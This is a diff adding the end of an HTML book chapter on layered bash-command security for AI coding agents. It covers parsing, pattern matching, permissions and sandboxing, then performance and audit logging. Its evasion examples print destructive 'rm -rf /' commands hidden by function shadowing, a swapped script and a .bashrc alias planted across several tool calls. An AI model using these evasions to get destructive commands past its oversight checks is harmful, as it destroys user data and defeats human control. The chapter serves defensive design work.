+<li><strong>Layer 4 (Permissions):</strong> Unknown commands require approval in default mode.</li>
+<li><strong>Layer 5 (Sandbox):</strong> The shell itself will fail to find the <code>рm</code> binary (it does not exist), so this particular evasion is actually harmless. But the general technique --- substituting visually similar characters --- works against human review, not against the shell.</li>
+</ul>
+<p><strong>Lesson:</strong> Normalize Unicode at the entry point of the security pipeline. Layer 1 should produce a canonical, ASCII-normalized command representation for all downstream analysis.</p>
+<h3 id="evasion-time-of-check-to-time-of-use-toctou">Evasion: Time-of-Check-to-Time-of-Use (TOCTOU)</h3>
+<div class="codehilite"><pre><span></span><code><span class="c1"># At check time: /tmp/safe_script.sh contains &quot;echo hello&quot;</span>
+<span class="c1"># Between check and execution: attacker replaces it with &quot;rm -rf /&quot;</span>
+bash<span class="w"> </span>/tmp/safe_script.sh
+</code></pre></div>
+
+<ul>
+<li><strong>Layers 1-4:</strong> Analyze the command as "execute a script." The script's contents at analysis time are safe.</li>
+<li><strong>Layer 5 (Sandbox):</strong> The sandbox restricts what the script can do regardless of its contents. If the sandbox denies writes to <code>/</code>, the replacement script fails.</li>
+</ul>
+<p><strong>Lesson:</strong> TOCTOU attacks bypass content analysis entirely because the content changes between analysis and execution. The sandbox is the only defense that works at execution time.</p>
+<h3 id="evasion-bash-function-shadowing">Evasion: Bash Function Shadowing</h3>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Define a function that shadows a safe command</span>
+<span class="k">function</span><span class="w"> </span>git<span class="o">()</span><span class="w"> </span><span class="o">{</span><span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>/<span class="p">;</span><span class="w"> </span><span class="o">}</span>
+git<span class="w"> </span>status<span class="w">  </span><span class="c1"># Actually runs rm -rf /</span>
+</code></pre></div>
+
+<ul>
+<li><strong>Layer 1 (Parser):</strong> Parses the function definition and the call separately.</li>
+<li><strong>Layer 2 (AST Analysis):</strong> If the AST analyzer tracks function definitions, it detects the shadow. If not, <code>git status</code> is classified as a safe DEV-TOOL.</li>
+<li><strong>Layer 3 (Pattern Matching):</strong> The <code>rm -rf /</code> in the function body is caught.</li>
+<li><strong>Layer 4 (Permissions):</strong> If Layer 3 catches it, the permission system blocks. If it does not, <code>git status</code> is auto-approved.</li>
+<li><strong>Layer 5 (Sandbox):</strong> Blocks the underlying <code>rm -rf /</code> regardless of how it was invoked.</li>
+</ul>
+<p><strong>Lesson:</strong> AST analysis should track function definitions and flag any function that shadows a known command name with different behavior. This is a static analysis problem --- treat function definitions as potential command redefinitions and analyze the body.</p>
+<h3 id="evasion-split-command-across-multiple-tool-calls">Evasion: Split Command Across Multiple Tool Calls</h3>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Call 1: Install a malicious alias</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;alias test=&#39;rm -rf /&#39;&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
+
+<span class="c1"># Call 2 (later in session): Source the modified bashrc</span>
+<span class="nb">source</span><span class="w"> </span>~/.bashrc
+
+<span class="c1"># Call 3 (later): Run the &quot;test&quot; command</span>
+<span class="nb">test</span>
+</code></pre></div>
+
+<ul>
+<li><strong>Individual layer analysis:</strong> Each command in isolation looks benign or moderately risky. <code>echo</code> appending to <code>.bashrc</code> is a write (flagged), <code>source</code> is indirect execution (flagged), and <code>test</code> is a builtin (allowed).</li>
+<li><strong>Cross-command analysis:</strong> Detecting this pattern requires correlating multiple tool calls across time --- something that no single-command analysis can do.</li>
+</ul>
+<p><strong>Lesson:</strong> Single-command analysis cannot detect multi-step attacks. Defenses include: (1) protecting shell config files (<code>.bashrc</code>, <code>.zshrc</code>) in the blocked path list, (2) flagging <code>source</code> of user-writable files, and (3) the sandbox preventing writes to shell config files in the first place.</p>
+<hr />
+<h2 id="1912-practical-considerations-for-production">19.12 Practical Considerations for Production</h2>
+<h3 id="performance-budget">Performance Budget</h3>
+<p>The security pipeline adds latency to every bash command. The budget:</p>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Target Latency</th>
+<th>Acceptable Range</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Parse</td>
+<td>&lt;5ms</td>
+<td>1-10ms</td>
+</tr>
+<tr>
+<td>AST Analysis</td>
+<td>&lt;2ms</td>
+<td>1-5ms</td>
+</tr>
+<tr>
+<td>Pattern Matching</td>
+<td>&lt;1ms</td>
+<td>0.5-3ms</td>
+</tr>
+<tr>
+<td>Permission Evaluation</td>
+<td>&lt;1ms</td>
+<td>0.5-2ms</td>
+</tr>
+<tr>
+<td>Sandbox Setup</td>
+<td>&lt;10ms</td>
+<td>5-20ms</td>
+</tr>
+<tr>
+<td><strong>Total</strong></td>
+<td><strong>&lt;20ms</strong></td>
+<td><strong>10-40ms</strong></td>
+</tr>
+</tbody>
+</table>
+<p>A 20ms overhead on a command that takes 5 seconds to execute is invisible. On a command that takes 10ms (like <code>echo "hello"</code>), it doubles the execution time. For ultra-fast commands, consider caching the security analysis: if the exact same command was approved within the last N seconds, skip the pipeline.</p>
+<h3 id="false-positive-management">False Positive Management</h3>
+<p>A security system that blocks too many legitimate commands will be bypassed. Track false positive rates by category:</p>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Acceptable FP Rate</th>
+<th>Mitigation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Filesystem Destruction</td>
+<td>5%</td>
+<td>Users confirm false positives once, session memory caches</td>
+</tr>
+<tr>
+<td>Network Exfiltration</td>
+<td>10%</td>
+<td>Many dev tools fetch URLs; need broad allowlisting for known tools</td>
+</tr>
+<tr>
+<td>Credential Theft</td>
+<td>2%</td>
+<td>Protected path list should be curated, not overly broad</td>
+</tr>
+<tr>
+<td>Process Manipulation</td>
+<td>15%</td>
+<td>Process management is common in dev; <code>kill</code> for test processes is routine</td>
+</tr>
+</tbody>
+</table>
+<p>The overall target: fewer than 1 in 20 commands should trigger a false positive in a typical development session. Above that rate, users will switch to bypass mode.</p>
+<h3 id="logging-and-auditability">Logging and Auditability</h3>
+<p>Every security decision should be logged with:</p>
+<ul>
+<li>The raw command string</li>
+<li>The AST (if parsing succeeded)</li>
+<li>The risk classification</li>
+<li>Which layer produced the decision</li>
+<li>The decision (allow/deny/ask) and reason</li>
+<li>The user's response (if asked)</li>
+</ul>
+<p>This audit log serves two purposes: debugging false positives ("why was my legitimate command blocked?") and incident response ("what commands did the agent execute during the compromised session?").</p>
+<hr />
+<h2 id="1913-architectural-patterns-and-takeaways">19.13 Architectural Patterns and Takeaways</h2>
+<h3 id="pattern-semantic-analysis-over-string-matching">Pattern: Semantic Analysis Over String Matching</h3>
+<p>Parse the command into a structured representation (AST) and analyze the structure, not the surface text. This pattern applies far beyond bash security --- any input validation that operates on structured data should parse first, validate second.</p>
+<h3 id="pattern-conservative-composition">Pattern: Conservative Composition</h3>
+<p>When a compound command contains both safe and dangerous components, classify the whole as dangerous. This is the "weakest link" principle applied to command analysis. A pipeline is only as safe as its most dangerous stage.</p>
+<h3 id="pattern-defense-in-depth-with-diverse-mechanisms">Pattern: Defense-in-Depth with Diverse Mechanisms</h3>
+<p>The five layers use different mechanisms: syntactic analysis, semantic classification, pattern matching, policy evaluation, and OS-level enforcement. Diversity matters because a single mechanism (like regex) has a single class of weakness. Diverse mechanisms have independent failure modes, making simultaneous bypass exponentially harder.</p>
+<h3 id="pattern-fail-open-parse-with-fail-closed-default">Pattern: Fail-Open Parse with Fail-Closed Default</h3>
+<p>When the parser fails, the command bypasses AST analysis but still faces pattern matching, permissions, and sandboxing. This is fail-open for parsing but fail-closed overall: the unparsed command is treated as high-risk, not as safe.</p>
+<h3 id="pattern-recursive-indirection-resolution">Pattern: Recursive Indirection Resolution</h3>
+<p>Commands that execute other commands (<code>eval</code>, <code>bash -c</code>, <code>xargs</code>) are recursively analyzed by re-entering the security pipeline. The recursion has a depth limit to prevent adversarial nesting. Beyond the limit, the command is classified as unknown/high-risk.</p>
+<hr />
+<h2 id="1914-cross-references">19.14 Cross-References</h2>
+<ul>
+<li><strong>Chapter 15:</strong> The Bash Tool covers the full shell parser implementation, which is Layer 1 of this security architecture.</li>
+<li><strong>Chapter 17:</strong> The Trust Model defines why bash commands are in the "tool trust domain" and require security analysis.</li>
+<li><strong>Chapter 18:</strong> Permission System Design covers Layer 4 (per-command permission evaluation) and the auto-mode classifier.</li>
+<li><strong>Chapter 20:</strong> Content Trust covers how untrusted content (like file contents or web fetch results) could contain injected bash commands.</li>
+<li><strong>Chapter 29:</strong> Hook Architecture covers how pre-execution hooks can add custom security checks as an additional layer.</li>
+</ul>
+<hr />
+<h2 id="summary">Summary</h2>
+<p>Bash security for AI CLI agents requires a multi-layer architecture because no single defense is sufficient. Regex fails because the shell's syntax is too rich for flat text analysis. Pattern matching catches known threats but misses novel evasion. Permissions depend on users making good decisions under fatigue. Sandboxes are configured for the session, not per-command.</p>
+<p>The five-layer architecture --- parse, analyze, pattern-match, permit, sandbox --- provides defense-in-depth where each layer catches the failures of the layers above it. The parser transforms strings into structure. The AST analyzer classifies intent. Pattern matching detects known dangers. The permission system involves the human. The sandbox limits the blast radius when everything else fails.</p>
+<p>For engineers building AI agents with shell access: start with the blocked command list and the sandbox. These two layers alone prevent the catastrophic cases. Add the parser and AST analysis when you need to handle sophisticated evasion. Add pattern matching for known threats. The permission system and auto-mode classifier (Chapter 18) provide the UX layer that makes all of this usable without driving users to bypass mode.</p>
+<p>In Chapter 20, we examine a threat that no amount of bash security can fully address: what happens when the data the agent processes contains instructions designed to subvert its behavior.</p>
+<div class="chapter-nav">
+  <a href="chapter-18.html">&larr; Previous</a>
+  <a href="index.html">Table of Contents</a>
+  <a href="chapter-20.html">Next &rarr;</a>
+</div>
+</div>
+</body>
+</html>
